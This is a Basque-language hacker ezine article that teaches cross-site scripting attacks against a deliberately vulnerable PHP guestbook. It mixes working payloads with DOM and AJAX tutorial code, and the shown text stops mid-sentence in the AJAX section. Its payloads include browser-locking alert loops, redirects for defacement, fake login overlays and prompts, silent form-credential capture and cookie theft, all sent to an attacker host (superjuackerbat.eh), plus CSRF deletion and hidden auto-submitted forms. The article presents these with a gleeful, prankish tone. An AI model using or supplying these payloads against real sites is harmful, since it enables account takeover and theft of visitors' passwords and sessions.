                               ==Jakin ezine==

                  <0x08>garren alea, <0x08>garren artikulua

                  
|=--=[ Dibertitzeko eta probetxuzko javascript kodeak xss erasoetan ]=---=|
|=-----------------------------------------------------------------------=|
|=-----------------------------=[ Pello X ]=-----------------------------=|
|=---------------------=[ pelKENDUlo@pellKENDUo.info ]=------------------=|


      
                  Edukiak

      (0). Eskenatokia eta lehen proba
      (1). Kaixo mundua
      (2). Alert-ekin porkulo ematen
      (3). Bagoaz hemendik
      (4). window objektuarekin jolasten
      (5). Erabiltzaileari datuak eskatu
      (6). Gertaerak harrapatzen
      (7). Cookie eta sesioen lapurketa
      (8). Session Ridding
      (9). Orriaz jabetu DOM bitartez
        (9.1).  DOM APIa
        (9.2).  Elementuak irakurri, aldatu, gehitu, trukatu eta ezabatu
        (9.3).  Idei zenbait
      (10). AJAX: aro berria
        (10.1). AJAXen adibide xinpleak
	(10.2). Datuak kanpora bidaltzen
        (10.3). Datuak usnatzen
      (11). Azken oharrak eta erreferentziak
      

      (0). Eskenatokia eta lehen proba
      ~~~~~~~~~~~~~~~~~~~~
XSS edo Cross site scripting web aplikazioetan eragin daiteke eraso xinple bat da. 
Web aplikazioak erabiltzaileak sartutako datuak tratatzerakoan kontuz ibiltzen ez
badira HTML, javascript-a eta edozer gauza sartzeko aukera eman dezakete formulario,
esteka eta edozein lekutan. Demagun gune batean erabiltzaileek iruzkinak uzteko 
aukera dutela. Erabiltzaile gaizkile batek html edo javascript kodea sartzen badu,
web hori bisitatzerakoan, gaizkileak sartutako kode hori zure nabigatzailera helduko
da. Zer egin dezake gaizkileak aukera hori ematen bazaio? idatzi honetan XSS
erasoen teknikak zaharrak eta berriak biltzen saiatu naiz, batez ere javascript
erasoei dagozkionak.

Probak egiteko php eta mysqlrekin garatutako guestbook bat erabiltzen da. 
Guestbook hau modu okerrean programatu da erabiltzaileak nahi adina probak
egin ditzan. index.php orrian erabiltzaileari mezu bat uzteko aukera ematen zaio eta
zerbait bidaltzen bada hauxe berehala gorde eta index.php orrian erakusten da.

Datuak zerbitzarian aztertzen ez direla probatzeko modu xinple bat html kodea
sartzea izan daiteke. HTML iruzkinak adibidez ez dira ikusiko:

 <!-- hau ez da ikusiko -->

Bestela etiketa xinpleak proba daitezke
 <b>Epa</b>
 
Dibertitzen hasteko efektuak sar daitezke:
 <marquee>Mugitzen ari naiz</marquee>
 <marquee><p style='font-size: 60pt'>Hizki handiak</p></marquee>
 
Soinua ere:
 <embed src="http://www.moviesoundscentral.com/sounds/star_wars/empire_strikes_back/darkside.wav">
 
 Edo izkutuago
 <bgsound src="http://www.moviesoundscentral.com/sounds/star_wars/empire_strikes_back/darkside.wav">
 
 Explorer barruan horrelako irudiak sar daitezke:
 <img dynsrc="http://www.moviesoundscentral.com/sounds/star_wars/empire_strikes_back/darkside.wav">

Baina kasu honetan javascript kodea sartu nahi dugu. Hori egiteko aukera bat baino gehiago dago.
<script language="javascript">
document.write("Javascript XSS bat");
</script>

Xinpleago:

<script>document.write("Javascript XSS bat");</script>

Kode asko sartu nahi izanez gero, kanpo fitxategi bat erabil daiteke.

<script language="javascript" src="http://superjuackerbat.eh/nirekodea.js"></script>

      (1). Kaixo mundua
      ~~~~~~~~~~~~~~~~~~~

Hasteko mezuak sar daitezke alert xinple batekin.
 <script> alert("Kaixo");</script>
 <script>alert("Hauxe alert bat da \n Jauzi eta guzti\n ongi ezta?");</script>


      (2). Alert-ekin porkulo ematen
      ~~~~~~~~~~~~~~~~~~~

Erabiltzaileak izorratzeko modu xinple bat alert amaigabeak sartzea da. Nabigatzailearen
prozesua hiltzera behartuko dugu. Gauza garrantzitsu bat erdizka utzi beharra gerta
daiteke nabigatzaile pestaña gehiago baldinbadauzka:

5 aldiz:
<script>
for (i=0;i<5;i++) 
      alert("5 aldiz "+ i);
</script>

Begizta amaigabea:
<script>
for (;;) 
      alert("Ez da amaituko");
</script>

window.confirm baten bitartez ere, izorratzeko modu ezberdinak daude.

<script>
function porkuloEman ()
{
      if (confirm("OK aukeratu eta utziko zaitut")) 
      {
            alert("Lasai egon. Ala ez?");
      }
      else
      {
            alert("Jarraitzen dut.");
      }
      porkuloEman();
}
porkuloEman();
</script>



      (3). Bagoaz hemendik
      ~~~~~~~~~~~~~~~~~~~

DoS edo hackeatze kutre bat orria atziezina bihurtzea izan daiteke. Penagarria,
xinple baino xinpleago baina arazorik gabe funtzionatzen duena:

<script>
document.location.href = "http://superjuackerbat.eh/deface.php";
</script>

Beste modu bat window-ekin:

<script>
window.location = "http://superjuackerbat.eh/deface.php";
</script>

Location-ekin beste horrenbeste egin daiteke:

<script>
location.assign("http://superjuackerbat.eh/deface.php");
</script>

Hau berdina da...
<script>
location.replace("http://superjuackerbat.eh/deface.php");
</script>

Baina gehiago jolas daiteke orriaren karga errepikatuz:

<script language="javascript">
setTimeout('birkarga()',100);

function birkarga ()
{
      location.reload();
      setTimeout('birkarga()',5);
}
</script>


      (4). window objektuarekin jolasten
      ~~~~~~~~~~~~~~~~~~~~~
      
Javascript lengoaiak Window izeneko objektua dauka eta honen bitartez 
nabigatzailearen leihoarekin gauza ezberdinak egin daitezke. Hauexek dira
objektu honen metodoak eta propietate ezagunenak:

 window.alert(msg) : mezu bat ateratzeko
 window.confirm(msg) : konfirmazio dialog bat ateratzeko
 window.prompt(msg) : datuak eskatzen dituen dialog bat
 window.print() : inpresoraren leihoa irekitzen du
 window.find() : bilaketa leihoa irekitzen du
 window.close() : nabigatzailea ixten saiatzen da. Konfirmazioa eskatzen da.
 
 window.Location = "http://www.juacker.net";
 
 Azkeneko hauekin orria izorratzea erreza eta dibertigarria da:
 window.resizeTo(x,y) : leihoaren tamaina aldatzeko

<script language="javascript">
window.resizeTo(10,10);
</script>

 window.moveTo(x,y) : leihoa mugitzeko
 window.moveBy(x,y) : leihoa horizontalki ala bertikalki mugitzeko

<script language="javascript">
window.resizeTo(0,0);
window.moveTo(0,0);
</script>


Honekin leihoa mugitzen da norabide batean...

<script language="javascript">
var x = 0;
var y = 0;

setTimeout('mugitu(x,y)',1000);

function mugitu (i,j)
{
      window.moveTo(i++,j++);
      x = (i>400)?0:i;
      y = (j>400)?0:j;
      setTimeout('mugitu(x,y)',5);
}
</script>
 
Ausazko mugimendua askoz dibertigarriagoa da noski:
<script language="javascript">
setTimeout('mugitu()',1000);
function mugitu ()
{
      window.moveTo(Math.round(Math.random()*200),Math.round(Math.random()*200));
      setTimeout('mugitu()',5);
}
</script>

 
 window.forward() : nabigazioan aurrera egiteko

 window.back() : nabigazioan atzera jotzeko

Honekin erabiltzaileak ezinezkoa izanen du orria ikustea.
<script language="javascript">
window.back();
</script>

 window.open() : popup delakoak irekitzeko

<script language="javascript">
window.open("http://www.superjuacker.net","","width=600,height=500");
</script>

 

      (5). Erabiltzaileari datuak eskatu
      ~~~~~~~~~~~~~~~~~~~~

window.prompt metodoaren bitartez, datu bat eskatzen duen alert antzeko bat
sor daiteke. Datu hartu eta beste leku batera bidal daiteke.

<script language="javascript">
var pasahitza = prompt("Sesioa amaitu da. Eman pasahitza mesedez");
document.location.href="http://superjuackerbat.eh/hartu.php?p=" + pasahitza;
</script>

IExplorer-en kasuan  window.createPopup funtzioa erabili daiteke. Honen bitartez ere
nahi dugun kodea sar dezakegu. Holako zerbait izan daiteke:

<SCRIPT language="javascript">
var leihoa = window.createPopup();
function ireki()
{
var  edukia = leihoa.document.body;
edukia.innerHTML = '<h1>HTML etiketak hemen...</h1>';
leihoa.show(290, 190, 200, 200, document.body);
}
ireki();
</SCRIPT>

Hau funtzionatzeko erabiltzailea luser xamarra izan beharko du. Modu elegante
batean egin daiteke, DIV bat erabiliz eta orriaren diseinuarekin murgilduz. Kasu
honetan DIV honek orri guztia beteko du eta erabiltzaileak ezin izango du besterik
ikusi. Formularioa betetzen badu erasotzaileari datuak bidaliko dizkio.

<script language="javascript">
document.getElementById('iruzur').style.visibility = "visible";
</script>

<div id='iruzur' style='position:absolute;z-index:1;width:100%;height:100%;top:0;left:0;
   border: 2px solid black;background-color: blue;visibility:false;'>
Saioa amaitu da. Mesedez erabiltzaile eta pasahitza sartu berriz.
<form method='post' action='http://superjuackerbat.eh/jaso.php'>
Izena:<input type='text' name='login'><br>
Pass:<input type='password' name='pass'><br>
<input type='submit'>
</form>
</div>


      (6). Gertaerak harrapatzen
      ~~~~~~~~~~~~~~~~

Javascript lengoaiarekin ebento edo gertaerak erabili daitezke, erabiltzaileak
zerbait egiten duenean ekintzaren bat burutzeko. Ebentoak HTML etiketetan
sar daitezke:
 
 <input type="button" name="botoia" value="Itxi" onClick="window.close()">
 
 <img src="irudia.jpg" onMouseOver="alert('irudi gainean zaude')">
 
Badago beste modu bat html dokumentoaren elemento baten gertaerei ekintza
bat esleitzeko:

 function funtzioa () { ... }
 document.getElementById("elementua").onclick = funtzioa;
 
Honek kristoren aukerak ekartzen ditu, berriz ere irudimena eta web lengoaien
ezagutzak izan daitezke limite bakarrak. Kasu honetan formularioetan sartzen
diren datuak harrapatzen saiatuko gara, holako kode bat sartuz:

      <script language="javascript">
      function agur()
      {
            alert('xss erasoa');
      }
      // Aukera bat baino gehiago dago gertaera esleitzeko:
      //document.loginform.onsubmit = new Function ("agur()");
      //document.loginform.onsubmit = agur;
      document.forms[0].onsubmit = agur;      
       </script>

Hori PoC bat da, baina nola lortu datuak? horiek jasotzeko formularioa objektua erabili
daiteke. Hortik aurrera datuak kanpora atera daitezke:

      <script language="javascript">
      function datuaklapurtu()
      {
            var login = document.forms[0].login.value;
            var password = document.forms[0].password.value;
            document.location.href = "http://superjuackerbat.eh/jaso.php?user=" + login +"&pass=" + password;
            alert('xss erasoa');
      }
      // Aukera bat baino gehiago dago gertaera esleitzeko:
      document.forms[0].onsubmit = datuaklapurtu;      
       </script>

Eraso horrek arazo bat dauka, erabiltzaileak berehala ikusiko duela zerbait
gertatu dela. Horregatik ezer ez nabaritzeko irudi bat sor daiteke src berezi
bat esleituz:

      <script language="javascript">
      
      // globalak izateko
      var login = document.forms[0].login.value;
      var password = document.forms[0].password.value;

      function datuaklapurtu()
      {
            var irudia = new Image;
            var gunea = "http://superjuackerbat.eh/jaso.php?user=" + login +"&pass=" + password;
            irudia.src = gunea;
      }
      // Aukera bat baino gehiago dago gertaera esleitzeko:
      document.forms[0].onsubmit = datuaklapurtu;      
       </script>
       


      (7). Cookie eta sesioen lapurketa
      ~~~~~~~~~~~~~~~~~~~~
      
document.cookie propietatearen bitartez zure erabiltzailearen cookia atera daiteke.

<script language="javascript">
alert("Cookieak: " + document.cookie);
</script>

Arazoa dator datu hori kanpora ateratzen denean, saioen kontrol xinplea egiten bada
session hijacking edo saioaren behiketa egitea errezten da. Cookiaren datua ateratzeko
nahikoa da holako zerbait egitea:

<script>
document.location.href="http://superjuackerbat.eh/jasocookie.php?ck="+ document.cookie;
</script>

Horrek arazo bat dauka, lapurketa modu argian egiten duela. Arazo hori ekiditeko eskaera
erabiltzaileak ikusi gabe egin daiteke, aurreko datuaklapurtu erabiliz adibidez:

      <script language="javascript">
      function datuaklapurtu()
      {
            var irudia = new Image;
            var gunea = document.location.href="http://superjuackerbat.eh/jasocookie.php?ck="+ document.cookie;
            irudia.src = gunea;
      }
       </script>


Behin cookiaren balioa lortuta, gure nabigatzailean ezarri dezakegu. Firefox-ek 
badu addon bat cookiak manipulatzeko...


      (8). Session Ridding
      ~~~~~~~~~~~~

Session Riding edo Cross-Site Request Forgeries (CSRF) delakoa nolabait eraso perfektoa da.
Erabiltzaileari saioa lapurtu ordez, bere saioa erabiliz erasoa egin daiteke. Erabiltzaileak
bisitatzen duen orri batean html+javascript kode gaizkilea sartzen bada, erabiltzaileak 
bere nabigatzailetik guk nahi duguna egin dezake.

Demagun holako zerbait sartzen dugula, irudiak erabili ordez CSS estilo orrien bitartez
eginen dugu:

<style type="text/css">
@import url(http://localhost/xssjavascript/del.php?id=1);
</style>


Administratzaileak testu hori daukan orria bisitatzen duenean, sarrera bat ezabatuko du,
eta ekintza hori berak egindakoa da, bere nabigatzailetik! erasotzaileak ez du saioa
lapurtzeko beharrik.

Guztiak ere ezaba daitezke:

<style type="text/css">
@import url(http://localhost/xssjavascript/del.php?id=denak);
</style>

Horrekin aplikazio zehatz bat erasotu da GET bitartez, baina ez litzateke oso zaila POST
eskaerak egitea, formulario izkutuak osatuz.

<form name="izkutua" method="post" action="http://superjuacker.eh/jasopost.php">
<input type="hidden" name="datu1">
</form>
<script>
document.forms.izkutua.datu1.value = "Sekretua: " + document.cookie;
document.forms.izkutua.submit();
</script>

Orain nahikoa da pentsatzea leku ezagunen formulario eta aplikazioek espero dituzten datuak
eta horrekin eraso zerrenda bat egin daiteke.


      (9). Orriaz jabetu DOM bitartez
      ~~~~~~~~~~~~~~~~~~~

HTML dokumentua etiketen egitura hierarkikoa da, ez besterik. Jar daitezkeen 
etiketa eta hauen orden posiblea DTD (edo Dokumento Motaren Definizioak) 
izeneko fitxategi batek agintzen du, erregela multzo baten itsura duena. DTD
dokumentu estandarrak dira eta HTMLren kasuan (HTMLek bere DTDa dauka) DTDa
web konsorzioa edo w3c.org-ak erabakitzen du.

Suposatzen da web orri guztiek DTD estandar bat jarraitzen dutela, bai HTML 
eta bai XHTML orrien kasuan, eta javascript lengoaiatik metodo batzuk daude
dokumentuen egitura hori atzitzeko, DOM apiaren bitartez.


          (9.1).  DOM APIa
          ~~~~~~~~~~~~~~~~~~~
        
        DOM edo Documen Object Model javascript lengoaiaren API bat da,
HTML dokumentu baten elementuen atzipena ahalbidetzen duena, etiketak, 
atributuak, etiketen edukia irakurri, aldatu, ezabatu, e.a... beraz
nahi dugun guztia egiteko aukera ematen digu. Beste modu batean esanda,
dokumentuaren edozein zati atzi dezakegu, etiketa edo elementu berriak gehitu,
elementuak kendu eta azken finean dokumentuaren egitura goitik bera manipula 
daiteke.

DOM tresna oso botoretsua da javascript garatzailearentzako, web 
interfazearekin jolasteko aukera amaitezinak eskeintzen dizkiona. Baina beste
alde batetik XSS sartzea uzten duten orrietan DOM APIa gaizkilearentzako
eraso aurreratuak burutzeko aukera ematen dio, dokumentua modu isilean
manipulatzeko ahalmena izango baitu.


        (9.2).  Elementuak irakurri, aldatu, gehitu, trukatu eta ezabatu
          ~~~~~~~~~~~~~~~~~~~

Adibide baten bitartez DOM APIaren funtzionamendua aztertuko dugu.
Demagun HTML dokumentu xinple hau daukagula:

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<title>Dokumentuaren elementu bat</title>

<script language="javascript">
// hemen DOM apiaren deiak sar daitezke
</script>

<body>
<div id="divblokea">Hauxe <b>izenburua</b> da
</div>
<ul>
<li><a href="argitaletxea.html">Argitaletxea</a></li>
<li><a href="egileak.html">Egileak</a></li>
<li><a href="albisteak.html">Albisteak</a></li>
<li><a href="harremanak.html">Harremanak</a></li>
</ul>
<input type="button" name="irakurri" value="Irakurri" onClick="irakurri()" >
<input type="button" name="aldatu" value="Aldatu" onClick="aldatu()" >
<input type="button" name="sortu" value="Sortu" onClick="sortu()" >
<input type="button" name="ezabatu" value="Ezabatu" onClick="ezabatu()" >
<input type="button" name="berreskuratu" value="Berreskuratu" onClick="berreskuratu()" >
</body>
</html>


 * Elementuak atzipena
 ----------------------

/**
* irakurri
* Dokumentuaren elementuak atzitzeko moduak erakusten
* du: DIV, irudiak, formularioak e.a.
*/
function irakurri () 
{
      // IDaren bitartez elementua irakurri
      var blokea = document.getElementById("divblokea");

      // TAG izena edo etiketaren bitartez irakurri: array bat itzultzen du
      var estekak = document.getElementsByTagName("a");

      // Array batean DIV guztiak
      var divblokeak = document.getElementsByTagName('div');

      // Barruko HTMLa ateratzen dugu
      var testua = blokea.innerHTML;
      var testua2 = divblokeak[0].innerHTML;

      alert("DIV barruan: " + testua + "\n" + testua2);

      /*
      // adibidez.. 
      var i = 0;
      var estekatestua = "";

      for (i=0;i<estekak.length;i++)
      {
            estekatestua += i+ "> " + estekak[i].innerHTML + "\n";
      }

      alert("Esteken testua: \n" + estekatestua);
      */

}


 * Elementuen aldaketa
 ----------------------

/**
* aldatu
* dokumentuaren elementuak aldatzeko funtzioa
*/
function aldatu() 
{
      // IDaren bitartez elementua irakurri
      var blokea = document.getElementById("divblokea");

      // TAG izena edo etiketaren bitartez irakurri: array bat itzultzen du
      var estekak = document.getElementsByTagName("a");


      blokea.innerHTML = "Orain <b>edukia</b> aldatzen dizut";
      blokea.style.backgroundColor = "yellow";


}


 * Elementu berrien sorkuntza
 -----------------------------


/**
* sortu
* elementu berriak sortzeko funtzioa
*/
function sortu()
{
      // IDaren bitartez elementua irakurri
      var blokea = document.getElementById("divblokea");

      // TAG izena edo etiketaren bitartez irakurri: array bat itzultzen du
      var zerrenda = document.getElementsByTagName("ul");

      var itemzerrenda = document.createElement("li");

      itemzerrenda.innerHTML = window.prompt("Zerrendarentzako edukiren bat sartu");

      // appendChild bitartez zerrendari eransten diogu
      zerrenda[0].appendChild(itemzerrenda);

      // Orain esteka berria sortuko dugu
      var estekaTestua = document.createTextNode("Super-esteka");
      var estekaBerria = document.createElement("a");

      estekaBerria.href = "http://aula0.cuatrovientos.org";

      estekaBerria.appendChild(estekaTestua);

      var itemzerrenda2 = document.createElement("li");
      itemzerrenda2.appendChild(estekaBerria);

      zerrenda[0].appendChild(itemzerrenda2);
      
      // HTML taula bat sortuko dugu orain
      var taula = document.createElement("table");
      
      // Taularen elementuak banan-banan sortu ordez, denak batera
      taula.innerHTML = "<tr><td>1. gelaska</td><td>2.garren gelaska</td></tr>";
      taula.border = 1;
      
      // ..eta dokumentuari gehitzen diogu
      document.body.appendChild(taula);

}


 * Elementuen ezabaketa
 -----------------------

var gordeta;

/**
* ezabatu
* dokumentuaren elementuak ezabatzeko funtzioa
*/
function ezabatu()
{
      // taula tag bitartez lortuko dugu
      var taulak = document.getElementsByTagName("table");

      // Taularen bigarren gelaska atzituko dugu
      var gelaska2 = document.getElementsByTagName("table")[0].childNodes.item(0).childNodes.item(0).lastChild;
      
      alert(gelaska2.innerHTML + " ezabatzera goaz, DIV blokearekin batera.");
      
      document.getElementsByTagName("table")[0].childNodes.item(0).childNodes.item(0).removeChild(gelaska2);
      
      // Elementua DIV bitartez lortu
      var blokea = document.getElementById("divblokea");

      // Blokea ezabatu baina berreskuratzeko aukerarekin...
      gordeta = document.body.removeChild(blokea);
      
      
}


 * Elementuen berreskuratzea
 ----------------------------


/**
* berreskuratu
* ezabatutako elementua berreskuratzen duen funtzioa
*/
function berreskuratu()
{
      
      document.body.appendChild(gordeta);
      
      //var besteblokea = gordeta.clone(true);
      
      // Hasieran sartzeko insertBefore metodoa erabili daiteke
      // horretarako inguruko elementua hartu beharko dugu
      var zerrenda = document.getElementsByTagName("ul");
      
      document.body.insertBefore(gordeta,zerrenda[0]);
}


Ikusi ditugun funtzio hauek DOM APIaren gainbegirada bezala balio dute. 
APIa askoz zabalagoa da eta probetxuzko gauza gehiago egin daitezke. Baina
pixkat ezagutzea nahikoa da eraso interesgarrietan pentsatzen hasteko...


          (9.3).  Idei zenbait
          ~~~~~~~~~~~~~~~~~~~

Bueno, ba DOM APIarekin egin daitekeene erakutsi ostean, galdera hau egin
daiteke: zer egin dezakegu tresna honekin. Ideia hauek izan ditzakezu, 
xinpleak, dibertigarriak,...

* Bannerraren edukia aldatu
* DIV bat gehitu menu berriekin, edo daudenak aldatu
* Formularioak aldatu bere edukia beste nonbaitera bidaltzeko
* Blog edo eztabaida gunera sarrera berriak gehitu
* Era guztitako datuak aldatu: bisita kopurua, iruzkin edo boto kopurua,...
* ... eta abar luze bat,

Proba bezala, guestbookan beste erabiltzaile bat utzitako testua aldatuko
dugu. Hori lortzeko lehenengo gauza dokumentuaren egitura aztertzea izanen da,
begi bistaz edo Firefox-en DOM Inspector tresna erabiliz. 
Testu atsegin bat aldatzeko gai izango gara.

Guestbookaren HTMLari begirada botatzen badiogu, sarrera bakoitza horrelako
DIV baten barruan doala ikusiko dugu:

<div class='sarrera' id='sarrera_6' >
Nor: <b>Devorah</b> - Noiz: <i>2007-06-06 10:24:39</i><br>
Web: <a href='http://www.test.com'>http://www.test.com</a><br>
<b><i>Atsegina zara</i></b></n><br>
<p>Zure webgunea itzela da.</p><br>
</div><hr>

Sarrera hau aldatzeko, horrelako javascript bat sartzea nahikoa litzateke:

<script>
function aldatu()
{      
      // Izenburu handia aldatuko dugu, jejeje
      var izenburua = document.getElementsByTagName("h1");
      
      izenburua[0].innerHTML = "NIRE GUESTBOOKa PENAGARRIA DA";
        
      var blokea = document.getElementById('sarrera_6');

      blokea.innerHTML = "Nor: <b>Juan José</b> - Noiz: <i>2007-06-06 10:24:39</i><br>";
      blokea.innerHTML += "<a href='http://www.ya.com'>http://www.ya.com</a><br>";
      blokea.innerHTML += "<b><i>Lastima, adar ederrak dauzkazu</i></b></n><br>";
      blokea.innerHTML += "<p>Jakin ezazu zure neska nire atzetik zihoala";
      blokea.innerHTML += "eta azkenean gertatu beharrekoa gertatu zen</p><br>";
}

// Hau ezin da zuzenean exekutatu, orria elementu guztiekin kargatuta egon beharko du
document.body.onload = aldatu();
</script>

Dibertigarria ezta?
Gauza serioagoak egin daitezke noski, orriaren segurtasuneri dagozkionak kasu:
pasahitzak lortzea adibidez.



      (10). AJAX: aro berriak
      ~~~~~~~~~~~~~~~~~~~

AJAX edo Asynchronous Javascript And Xml web aplikazioetan erabili daitekeen
teknologia multzo bat da, nabigatzaileak zerbitzariari eskaerak egiteko gaitasuna
ematen diona orria birkargatu gabe. Hau aurrerapauso handia da, orain arte 
bezeroak edo nabigatzaileak orria eskatzerakoan zerbitzariak pasatzen zion eta
kitto! hortxe bukatzen zen bien arteko erlazioa. AJAXekin ordea, bien arteko 
erlazioa bizirk mantentzea lor daiteke, eta bezeroak datu berriak elkartruka
ditzake zerbitzariarekin berriz kargatzeko beharrik gabe.
AJAX bitartez datu eskaerak eta bidalketak egin daitezke modu gardenean eta
horri DOM APIa gaineratuz web dokumentua modu guztiz dinamikoan eraldatu 
daiteke. Bi teknologia hauek batuz duela gutxi arte pentsaezina zen 
funtzionalidadea lor daiteke.
Baina teknologia berri guztiak bezalaxe, berrikuntza eta abantailekin batera
arriskuak datoz, eta askok pentsatuko zenuten moduan nabigatzaileak eskaera
izkutuak egiteko ahalmen hori oso erakargarria da helburu gaizkileak dituen
erabiltzaile batentzat.


        (10.1). AJAXen adibide xinpleak
          ~~~~~~~~~~~~~~~~~~~

AJAX eskaerak egiteko pauso minimo batzuk jarraitu behar dira.
Garrantzitsuena XMLHttpRequest objektu bat sortzea da, horrekin eskaerak
egingo baitira. Jarraian bi adibide ikusiko ditugu, bata 'kaixo mundua' 
estilokoa eta bestea parametroak erabiltzen dituena


 * AJAX, kaixo mundua
 ----------------------

AJAX bitartez eskaera bat egiten du eta erantzunarekin DIV bat betetzen du.


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="es" dir="ltr" lang="es">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
 <title>Ajax, Asynchronous Javascript And XMLren adibide xinplea : agurra</title>
 <script type="text/javascript">
 /*<![CDATA[*/
 
 
 /**
 * ajaxAgurra: AJAXen adibide oinarrizkoena
 * Funtzio honek nabigatzaileak zerbitzariari eskaera gardenak egiteko
 * objektuaren instantzia sortzen du. Printzipioz explorer 6 sp2 eta Firefox 1.0 eta 2.0an
 * probatu da. 
 * Egiten duena tontakeri hutsa da: orri bat eskatu eta itzultzen duen testua
 * alert batekin erakutsiko da.
 */
 function ajaxAgurra () {
       // Nabigatzailearen arabera AJAX objektua sortu
       if (window.XMLHttpRequest) { // Mozilla eta geckon oinarrituta daudenentzat
          xmlhttprequest = new XMLHttpRequest();
      } else if (window.ActiveXObject) { // Microtxotx exploiter familiarentzat
          xmlhttprequest = new ActiveXObject("Microsoft.XMLHTTP");
      } 
      
      // ERANTZUNARENTZAT PRESTATU
      // Euskarri edo handler funtzio bat esleitu beharko da.
      // hots, XML edo erantzuna prozesatzeaz arduratuko dena
      // nor den esaten diogu.
      // Horrela egin daiteke
      //      xmlhttprequest.onreadystatechange = XMLprozesatu;
      // Baina hobe horrela, parametroa adierazteko.
      xmlhttprequest.onreadystatechange = function() { XMLprozesatu(xmlhttprequest); };
      
      // ESKAERA EGIN
      // open(metodoa: GET edo POST,eskatzen dugun orria, asinkronoa ala ez)
      xmlhttprequest.open('GET', 'agurra.xml', true);
       
       // Ez du zertan XML edukia izan behar, testu hutsa izan daiteke
       //xmlhttprequest.open('GET','testua.txt',true);
       
       // Send egiten dugu eskaera burutzeko.
       // eskaerak parametrorik ez duenez null jartzen dugu
       xmlhttprequest.send(null); 
       
 }
 
 /**
 * XMLprozesatu
 * parametro bezala xmlhttprequest objektua behar du
 * procesaXML
 * Euskarri bezala erabili behar den funtzioa da, AJAXen
 * erantzuna jaso ahal izateko.
 */
 function XMLprozesatu (xhr) {

      // Erantzunaren egoera kodea aztertu behar da lehenbizi
      // 0: hasieratu gabe
      // 1 : kargatzen
      // 2 : kargatuta
      // 3 : interaktiboa
      // 4 : eginda
       if (xhr.readyState == 4) {
                  // HTTP zerbitzariaren erantzun kodea aztertzen dugu
                  // Dena ongi badago 200 (OK) izanen da
                  // proba gure makinan bertan eginda, ez da beharrezkoa...
                   //if (xhr.status == 200) {
                         var emaitza = xhr.responseText;
                         var blokea= document.createElement("div");
                         blokea.innerHTML = "<b>" + emaitza + "</b>";
                         document.body.appendChild(blokea);

                    //} else {
                    //      alert("Errorea erantzuna jasotzerakoan");
                   //}
        } else {
          // Oraindik ez daukagu erantzuna
        }
 }
 

 
 /*]]>*/
 </script>
</head>
<body> 
<p>
AJAXen adibide xinplea. Estekan clic eginda eskaera bat eginen da eta birkargarik gabe edukia lortu
eta erakutsiko da.
</p>
<a href="javascript:ajaxAgurra()">AJAX eskaera egin agurra ateratzeko</a>
<hr />

  
</body>
</html>


-agurra.xml fitxategiaren edukia:

<?xml version="1.0"?> 
<agurra>
Kaixo mundua!
</agurra>



 * POST adibidea AJAXekin
 -------------------------

Ikus dezagun nola bidaltzen diren parametroak POST bitartez AJAX
eskaera batean. Adibidean web orritik zenbateko bat bidaltzen zaio
zerbitzarian dagoen euro bihurgailu bati. Honek erantzuna eman
eta web orrian alert batekin erakusten da emaitza.


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="eu" dir="ltr" lang="eu">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
 <title>Ajax, Asynchronous Javascript And XML adibidea, parametroekin: Euro-pezeta bihurgailua</title>
 <script type="text/javascript">
 /*<![CDATA[*/
 
 
 /**
 * bihurgailua :  AJAX adibidea, paramtroekin
 * bihurketa botoia sakatzerakoan, zenbatekoa hartu eta zerbitzariaren php orri
 * bati eskaera egiten zaio. Erantzuna alert batekin ateratzen da.
 */
  function bihurgailua () {
  
              var zenbatekoa = document.getElementById("bihurgailua").value;
                
       // Nabigatzailearen arabera AJAX objektua sortu
       if (window.XMLHttpRequest) { // Mozilla eta geckon oinarrituta daudenentzat
          xmlhttprequest = new XMLHttpRequest();
      } else if (window.ActiveXObject) { // Microtxotx exploiter familiarentzat
          xmlhttprequest = new ActiveXObject("Microsoft.XMLHTTP");
      } 
      
      // ERANTZUNARENTZAT PRESTATU
      // Euskarri edo handler funtzio bat esleitu beharko da.
      xmlhttprequest.onreadystatechange = function() { bihurgailuaProzesatu(xmlhttprequest); };
      
      
      // ESKAERA EGIN
      // open(metodoa: GET edo POST,eskatzen dugun orria, asinkronoa ala ez)
      xmlhttprequest.open('POST', 'bihurtu.php', true);
       
      // POST eragiketa prestatzen dugu.
      // eskaeraren goiburuan zenbait aukera ezarri beha dira
      xmlhttprequest.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
       
      // Orain send egiterakoan parametroak pasa behar ditugu.
      // nolabait querystring bat sortu behar da, parametro_izena=balioa itsurarekin
       xmlhttprequest.send("bihurgailua="+zenbatekoa);
       
 }
 
 /**
 * bihurgailuaProzesatu
 * Euskarri bezala erabili behar den funtzioa da, AJAXen
 * erantzuna jaso ahal izateko.
 */
 function bihurgailuaProzesatu (xhr) {

       // Erantzunaren egoera aztertu
       if (xhr.readyState == 4) {
                  // HTTP zerbitzariaren erantzuna 200 denean
                   if (xhr.status == 200) {
                        // zuzenean erantzuna atera
                         alert(xhr.responseText);
                    } else {
                          alert("Ez da erantzun egokia jaso zerbitzaritik.\n HTTP erantzuna: " + xhr.status);
                   }
        } else {
          // Erantzunik ez...
        }
 }
 
 
 /*]]>*/
 </script>
</head>
<body> 
Adibide honetan, testu kutxan dagoen zenbatekoa hartu eta AJAX bitartez orri
bati bidaltzen zaion bihurketa egin dezan. Erantzuna jasotzerakoan alert batekin erakusten da.
<input type="text" name="Bihurgailua" id="bihurgailua" value="" />
<input type="button" name="botoia" id="botoia" value="Bihurtu &euro;ak pezetatan." onclick="bihurgailua()" />

<hr />
  
</body>
</html>


-bihurtu.php

Euro-Pezeta bihurketa egiten duen php fitxategia da, ez besterik.



          (10.2). Datuak kanpora bidaltzen
          ~~~~~~~~~~~~~~~~~~~

OK, AJAX eskaera oinarrizkoak egiten dakigu, baina jakina da teknologia
honek limiteak dauzkala eskaerak bere jatorriko domeinukoak ez direnei
egiteko. Hau da, AJAX kodetik ezin da edozein webgunera eskaerak egin,
